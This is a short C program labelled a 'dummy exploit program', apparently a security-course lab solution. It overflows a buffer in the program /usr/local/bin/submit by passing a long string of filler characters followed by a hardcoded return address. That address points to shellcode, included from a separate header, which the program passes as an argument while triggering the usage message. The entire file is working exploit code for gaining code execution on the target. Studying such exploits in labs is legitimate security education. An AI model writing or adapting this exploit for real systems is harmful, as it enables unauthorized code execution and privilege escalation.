/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"

int main(void)
{
  char *args[4];
  char *env[1];

  // another way
  int syntaxLen = strlen("Syntax:\n\t");                    // the length of characters already in the buffer
  int addressLen = 4;                                       // the length of a single memory address
  int bufferLen = 211 - syntaxLen + addressLen + 1;         // the number of filler characters that must be printed before the return address is reached
  char buffer[bufferLen + addressLen + 1];                  // the full string to be passed in

  // loop through filling up the buffer with garbage
  int i = 0;
  while(i < bufferLen) {
    buffer[i] = 'm';
    i = i + 1;
  }

  // add the address of args[2] in little endian to the end of the buffer
  buffer[i++] = 0xb8;
  buffer[i++] = 0xdf;
  buffer[i++] = 0xbf;
  buffer[i++] = 0xff;

  args[0] = buffer;                                         // string to overflow the buffer
  args[1] = "-h";                                           // flag to trigger print_usage
  args[2] = shellcode;                                      // shellcode to be executed
  args[3] = NULL;

  env[0] = NULL; 

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}
